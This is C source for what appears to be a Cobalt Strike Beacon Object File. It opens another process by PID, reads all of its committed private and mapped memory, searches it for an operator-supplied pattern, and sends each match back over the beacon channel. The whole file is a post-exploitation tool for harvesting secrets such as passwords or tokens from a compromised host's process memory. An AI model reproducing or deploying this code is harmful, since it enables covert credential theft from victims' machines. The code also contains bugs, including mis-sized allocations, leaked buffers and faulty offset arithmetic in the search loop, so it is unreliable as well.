#include <stdio.h>
#include <windows.h>
#include "beacon.h"


WINBASEAPI HANDLE WINAPI KERNEL32$VirtualQueryEx(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T);
WINBASEAPI void *__cdecl MSVCRT$calloc(size_t _NumOfElements, size_t _SizeOfElements);
WINBASEAPI void *__cdecl MSVCRT$memchr(void * ptr, int value, size_t num );
WINBASEAPI int __cdecl MSVCRT$memcmp( const void * ptr1, const void * ptr2, size_t num );
WINBASEAPI size_t __cdecl MSVCRT$strlen( const char * str );
WINBASEAPI int __cdecl MSVCRT$sprintf(char *, const char *, ...);
	
static  unsigned char* find_all(unsigned char* buffer, SIZE_T bufferLen, unsigned char* pattern, SIZE_T patternLen) {
    unsigned char* match = NULL;
    SIZE_T offset = 0;
    while (offset < bufferLen) {
        match = MSVCRT$memchr(buffer + offset, pattern[0], bufferLen - offset);
        if (match == NULL) {
            return NULL;
        }
        else {
            size_t remaining = bufferLen - offset - (match - buffer);
            if (patternLen <= remaining) {
                if (MSVCRT$memcmp(match, pattern, patternLen) == 0) {
                    return match;
                }
                offset = match - buffer + 1;
            }
            else {
                return NULL;
            }
        }       
    }
    return NULL;
}

void find_locs(HANDLE process, char* pattern, SIZE_T sz) {
    unsigned char* p = NULL;
    MEMORY_BASIC_INFORMATION info; 
    for (p = NULL; KERNEL32$VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info); p += info.RegionSize)
    {
        unsigned char* buffer;
        unsigned char* tempBuffer;
        int isTarget = 0;

        if (info.State == MEM_COMMIT &&
            (info.Type == MEM_MAPPED || info.Type == MEM_PRIVATE))
        {
            SIZE_T bytes_read;
            tempBuffer = MSVCRT$calloc(info.RegionSize, sizeof(tempBuffer));
            KERNEL32$ReadProcessMemory(process, p, &tempBuffer[0], info.RegionSize, &bytes_read);
            unsigned char* match = find_all(tempBuffer, bytes_read, pattern, MSVCRT$strlen(pattern));
	    if (match) {
		char * fmt = MSVCRT$calloc(40, sizeof(char));
		MSVCRT$sprintf(fmt, "[*] MATCH FOUND : %%.%ds \n", sz);
                BeaconPrintf(CALLBACK_OUTPUT, fmt, match);
            }
        }
    }
}

int go(char* argc, int len) {
    datap parser;
    BeaconDataParse(&parser, argc, len);
    int pid = BeaconDataInt(&parser);
    char* pattern = BeaconDataExtract(&parser, NULL);
    int sz = BeaconDataInt(&parser);
    HANDLE process = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    find_locs(process, pattern, sz);
    return 0;
}
